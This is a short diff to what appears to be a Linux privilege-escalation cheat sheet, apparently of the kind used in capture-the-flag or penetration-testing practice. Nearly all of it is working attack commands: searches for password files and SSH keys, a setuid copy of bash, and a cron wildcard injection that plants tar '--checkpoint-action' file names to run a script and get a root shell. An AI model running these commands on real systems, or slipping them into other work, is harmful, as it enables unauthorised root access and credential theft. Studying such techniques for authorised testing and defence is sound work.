@@ -40,15 +40,19 @@ Password files - locate password
 
 Finding ssh keys - find / -name id_rsa 2> /dev/null
 
-### Useful commands
+## Useful commands
 
 echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p" > file
 
 cron wildcards
 '''
+
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
+
 touch /home/user/--checkpoint=1
+
 touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+
 /tmp/bash -p
 
 '''
